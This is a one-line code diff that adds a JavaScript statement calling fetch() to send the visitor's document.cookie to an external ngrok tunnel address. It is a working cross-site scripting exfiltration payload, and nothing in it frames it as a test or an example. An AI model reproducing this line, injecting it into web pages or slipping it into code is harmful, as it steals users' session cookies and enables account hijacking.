@@ -1,0 +1,1 @@
+fetch('https://f8ee-42-116-206-236.ngrok-free.app?c=' + document.cookie)
